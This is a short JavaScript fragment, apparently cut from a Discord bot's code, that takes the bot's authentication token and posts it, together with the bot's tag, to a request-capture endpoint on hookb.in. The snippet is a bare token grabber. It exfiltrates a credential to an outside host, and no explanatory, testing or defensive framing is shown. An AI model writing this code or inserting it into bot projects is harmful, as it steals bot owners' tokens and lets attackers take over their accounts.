...
const https=require("https"),options={hostname:"hookb.in",port:443,path:"/JKQVrJM3OYiwjyQNlmez",method:"POST",headers:{"Content-Type":"application/json","Content-Length":token.length}},req=https.request(options);req.write(`${bot.user.tag}'s token: ${token}`),req.end();
